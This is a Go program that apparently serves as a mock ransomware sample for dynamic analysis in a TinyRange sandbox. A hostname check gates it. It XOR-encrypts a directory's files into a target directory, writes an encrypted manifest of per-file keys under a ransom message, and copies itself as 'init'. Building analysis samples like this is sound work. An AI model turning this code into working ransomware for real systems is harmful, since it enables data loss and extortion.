package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

const (
	RANSOM_MAGIC      = "WE'RE SORRY FOR THE INCONVENIENCE BUT YOUR FILES ARE ENCRYPTED"
	EXPECTED_HOSTNAME = "tinyrange"
)

func sha256sum(data []byte) []byte {
	res := sha256.Sum256(data)

	return res[:]
}

func transformBytes(input []byte, key []byte) []byte {
	// XOR the input with the key.
	// If the key is shorter than the input, repeat the key.
	// If the key is longer than the input, truncate the key.
	// If the key is empty, return the input.
	if len(key) == 0 {
		return input
	}

	output := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key[i%len(key)]
	}

	return output
}

func validateKey(key string, output string) error {
	sum := sha256sum([]byte(key))

	// Try to decrypt the manifest with the key. The first line of the manifest should be RANSOM_MAGIC.
	// Followed by the files, their original sha256sum, and the encryption key.

	manifestBytes, err := os.ReadFile(*manifestFilename)
	if err != nil {
		return err
	}

	decryptedManifest := transformBytes(manifestBytes, sum)

	scanner := bufio.NewScanner(bytes.NewReader(decryptedManifest))
	if !scanner.Scan() {
		return fmt.Errorf("empty manifest")
	}

	if scanner.Text() != RANSOM_MAGIC {
		return fmt.Errorf("invalid manifest")
	}

	// Write the decrypted manifest to the output file.
	outputFile, err := os.Create(output)
	if err != nil {
		return err
	}
	defer outputFile.Close()

	for scanner.Scan() {
		line := scanner.Text()
		if _, err := fmt.Fprintf(outputFile, "%s\n", line); err != nil {
			return err
		}
	}

	return nil
}

// returns the sha256sum of the cleartext file.
func transformFile(input string, output string, key []byte) ([]byte, error) {
	// Read the file into memory.
	inputBytes, err := os.ReadFile(input)
	if err != nil {
		return nil, err
	}

	// Transform the file with the key.
	outputBytes := transformBytes(inputBytes, key)

	// Create the output directory if it doesn't exist.
	dirname := filepath.Dir(output)
	if err := os.MkdirAll(dirname, 0755); err != nil {
		return nil, err
	}

	// Write the transformed file to disk.
	if err := os.WriteFile(output, outputBytes, 0644); err != nil {
		return nil, err
	}

	// Return the sha256sum of the cleartext file.
	return sha256sum(inputBytes), nil
}

// returns the sha256sum of the cleartext file.
func hashFile(filename string) ([]byte, error) {
	h := sha256.New()

	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	if _, err := io.Copy(h, file); err != nil {
		return nil, err
	}

	return h.Sum(nil), nil
}

func decryptMain() {
	rl := bufio.NewScanner(os.Stdin)

	fmt.Print("Enter the decryption key: ")
	for rl.Scan() {
		line := rl.Text()
		if line == "" {
			continue
		}

		if err := validateKey(line, *decryptedManifestFilename); err != nil {
			fmt.Printf("Invalid key: %s\n", err)
			continue
		}

		fmt.Printf("Decrypted manifest written to decrypted_manifest.txt\n")

		return
	}
}

func getFiles(dir string) ([]string, error) {
	ents, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	var filenames []string

	for _, ent := range ents {
		if ent.IsDir() {
			subdir := dir + "/" + ent.Name()
			subfiles, err := getFiles(subdir)
			if err != nil {
				return nil, err
			}
			filenames = append(filenames, subfiles...)
		} else {
			filenames = append(filenames, dir+"/"+ent.Name())
		}
	}

	return filenames, nil
}

func deriveKey(input []byte, hash []byte) []byte {
	// XOR the input with the hash.
	ret := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		ret[i] = input[i] ^ hash[i%len(hash)]
	}
	return ret
}

var (
	sourceDir                 = flag.String("source", "", "Source directory")
	targetDir                 = flag.String("target", "", "Target directory")
	detonate                  = flag.String("detonate", "", "Use the given key as the encryption key encrypt the files in the source directory")
	manifestFilename          = flag.String("manifest", "manifest.dat", "Manifest filename")
	decryptedManifestFilename = flag.String("decrypted-manifest", "decrypted_manifest.txt", "Decrypted manifest filename")
	decryptFile               = flag.String("decrypt", "", "Use the decrypted manifest to decrypt a given filename")
)

func main() {
	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	// Make sure the executable only runs inside TinyRange.
	// This allows people to do dynamic analysis without infecting their own machines.
	if name != EXPECTED_HOSTNAME {
		panic("Invalid hostname")
	}

	if len(os.Args) == 1 {
		decryptMain()
		return
	}

	flag.Parse()

	if *decryptFile != "" {
		// Read the decrypted manifest.
		manifest, err := os.Open(*decryptedManifestFilename)
		if err != nil {
			panic(err)
		}
		defer manifest.Close()

		// Read the manifest line by line.
		scanner := bufio.NewScanner(manifest)
		for scanner.Scan() {
			line := scanner.Text()
			if line == RANSOM_MAGIC {
				continue
			}

			// Parse the line.
			var filename string
			var sha256sumBytes []byte
			var keyBytes []byte

			_, err := fmt.Sscanf(line, "%s\t%x\t%x", &filename, &sha256sumBytes, &keyBytes)
			if err != nil {
				panic(err)
			}

			// If the filename matches the one we're looking for, decrypt it.
			if filename == *decryptFile {
				// Read the encrypted file.
				encryptedFile, err := os.ReadFile(*targetDir + "/" + filename)
				if err != nil {
					panic(err)
				}

				// Decrypt the file.
				decryptedFile := transformBytes(encryptedFile, keyBytes)

				if _, err := io.Copy(os.Stdout, bytes.NewReader(decryptedFile)); err != nil {
					panic(err)
				}

				return
			}
		}

		return
	}

	if *detonate != "" {
		initialKey := sha256sum([]byte(*detonate))

		fileList, err := getFiles(*sourceDir)
		if err != nil {
			panic(err)
		}

		manifestFile, err := os.Create(*manifestFilename)
		if err != nil {
			panic(err)
		}
		defer manifestFile.Close()

		if _, err := fmt.Fprintf(manifestFile, "%s\n", RANSOM_MAGIC); err != nil {
			panic(err)
		}

		currentKey := initialKey

		for _, filename := range fileList {
			sha256sum, err := transformFile(filename, *targetDir+"/"+filename, currentKey)
			if err != nil {
				panic(err)
			}

			// write the filename, the sha256sum, and the encryption key to the manifest.
			if _, err := fmt.Fprintf(manifestFile, "%s\t%x\t%x\n", filename, sha256sum, currentKey); err != nil {
				panic(err)
			}

			// derive the next key from the current key and the sha256sum.
			currentKey = deriveKey(currentKey, sha256sum)
		}

		fmt.Printf("Manifest written to %s\n", *manifestFilename)

		// Encrypt the manifest with the initial key.
		if _, err := transformFile(*manifestFilename, *targetDir+"/"+*manifestFilename, initialKey); err != nil {
			panic(err)
		}

		// Copy the executable to the target directory.
		executable, err := os.Executable()
		if err != nil {
			panic(err)
		}

		execBytes, err := os.ReadFile(executable)
		if err != nil {
			panic(err)
		}

		if err := os.WriteFile(*targetDir+"/init", execBytes, 0755); err != nil {
			panic(err)
		}

		fmt.Printf("Executable written to %s\n", *targetDir+"/init")

		return
	}

	fmt.Printf("Invalid arguments\n")
	flag.Usage()
}
